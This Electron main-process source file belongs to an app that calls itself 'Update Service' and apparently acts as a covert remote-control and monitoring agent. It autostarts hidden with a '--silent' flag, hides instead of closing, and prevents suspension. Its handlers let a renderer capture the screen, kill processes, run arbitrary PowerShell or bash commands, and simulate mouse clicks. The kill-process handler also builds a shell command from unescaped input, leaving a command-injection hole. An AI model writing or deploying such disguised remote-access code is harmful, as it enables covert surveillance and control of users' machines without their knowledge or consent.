import { app, shell, BrowserWindow, dialog, Menu, ipcMain, desktopCapturer, powerSaveBlocker, screen } from 'electron'
import { join } from 'path'
import { exec } from 'child_process'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'

process.on('uncaughtException', (err) => {
  dialog.showErrorBox('Ошибка запуска', err.stack || err.message)
})

// Single instance lock — if launched again while running, show the window
const gotLock = app.requestSingleInstanceLock()
if (!gotLock) {
  app.quit()
}

let mainWindow = null
let isHidden = false

// Detect silent start (launched from Windows autostart)
const isSilentStart = process.argv.includes('--silent')

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1100,
    height: 750,
    minWidth: 900,
    minHeight: 600,
    show: false,
    title: 'Update Service',
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      contextIsolation: true,
      backgroundThrottling: false,
    }
  })

  mainWindow.on('ready-to-show', () => {
    if (!isSilentStart) {
      mainWindow.show()
    } else {
      // Silent start — stay hidden, appear offline
      isHidden = true
      mainWindow.webContents.send('visibility-change', false)
    }
  })

  // Instead of closing — hide and notify renderer to stop heartbeat
  mainWindow.on('close', (e) => {
    e.preventDefault()
    mainWindow.hide()
    isHidden = true
    mainWindow.webContents.send('visibility-change', false)
  })

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    shell.openExternal(url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

// Second instance launched — show window
app.on('second-instance', () => {
  if (mainWindow) {
    mainWindow.show()
    isHidden = false
    mainWindow.webContents.send('visibility-change', true)
  }
})

// ── IPC handlers ────────────────────────────────────────────────────────────

ipcMain.handle('capture-screen', async () => {
  try {
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 1280, height: 720 },
    })
    if (!sources.length) return null
    return sources[0].thumbnail.toJPEG(60).toString('base64')
  } catch {
    return null
  }
})

ipcMain.handle('get-screen-source-id', async () => {
  try {
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 0, height: 0 },
    })
    return sources[0]?.id || null
  } catch {
    return null
  }
})

ipcMain.handle('kill-process', (_, name) => new Promise((resolve) => {
  const cmd = process.platform === 'win32'
    ? `taskkill /f /im "${name}"`
    : `pkill -9 "${name}"`
  exec(cmd, () => resolve())
}))

ipcMain.handle('get-processes', () => new Promise((resolve) => {
  const cmd = process.platform === 'win32'
    ? 'tasklist /fo csv /nh'
    : 'ps ax -o comm='
  exec(cmd, (err, stdout) => {
    if (err) { resolve([]); return }
    let names
    if (process.platform === 'win32') {
      names = stdout.trim().split('\n').map(line => line.split('","')[0].replace(/"/g, '').trim())
    } else {
      names = stdout.trim().split('\n').map(l => l.trim().split('/').pop())
    }
    resolve([...new Set(names.filter(Boolean))].sort((a, b) => a.localeCompare(b)))
  })
}))

ipcMain.handle('exec-command', (_, cmd) => new Promise((resolve) => {
  // Use EncodedCommand on Windows to avoid all quoting issues
  const command = process.platform === 'win32'
    ? `powershell -NonInteractive -EncodedCommand ${Buffer.from(cmd, 'utf16le').toString('base64')}`
    : `bash -c ${JSON.stringify(cmd)}`
  exec(command, { timeout: 15_000, maxBuffer: 2 * 1024 * 1024 }, (err, stdout, stderr) => {
    const out = (stdout + stderr).trim()
    resolve(out || (err?.killed ? '(timeout)' : '(нет вывода)'))
  })
}))

ipcMain.handle('simulate-click', (_, nx, ny) => new Promise((resolve) => {
  const display = screen.getPrimaryDisplay()
  const absX = Math.round(nx * display.size.width)
  const absY = Math.round(ny * display.size.height)

  if (process.platform === 'win32') {
    // Base64-encoded UTF-16LE PowerShell script to avoid shell quoting issues
    const script = [
      `Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool SetCursorPos(int x,int y);`,
      `[DllImport("user32.dll")] public static extern void mouse_event(uint d,int x,int y,uint c,uint i);'`,
      `-Name U -Namespace W`,
      `[W.U]::SetCursorPos(${absX},${absY})`,
      `[W.U]::mouse_event(2,0,0,0,0)`,
      `[W.U]::mouse_event(4,0,0,0,0)`,
    ].join('\n')
    const encoded = Buffer.from(script, 'utf16le').toString('base64')
    exec(`powershell -EncodedCommand ${encoded}`, () => resolve())
  } else {
    exec(`osascript -e 'tell application "System Events" to click at {${absX}, ${absY}}'`, () => resolve())
  }
}))

ipcMain.handle('force-quit', () => {
  mainWindow.destroy()
  app.quit()
})

ipcMain.handle('remove-autostart', () => {
  if (process.platform === 'win32') {
    app.setLoginItemSettings({ openAtLogin: false, args: ['--silent'] })
  }
})

ipcMain.handle('get-hidden-state', () => isHidden)

// ── App lifecycle ────────────────────────────────────────────────────────────

app.whenReady().then(() => {
  Menu.setApplicationMenu(null)
  electronApp.setAppUserModelId('com.karagroup.worker')

  // Prevent app suspension — keeps timers and streams running in background
  powerSaveBlocker.start('prevent-app-suspension')

  // Windows auto-start: add with --silent flag if not already set
  if (process.platform === 'win32') {
    const settings = app.getLoginItemSettings({ args: ['--silent'] })
    if (!settings.openAtLogin) {
      app.setLoginItemSettings({
        openAtLogin: true,
        path: process.execPath,
        args: ['--silent'],
      })
    }
  }

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  createWindow()

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

// Never quit when all windows closed — keep running in background
app.on('window-all-closed', () => {})
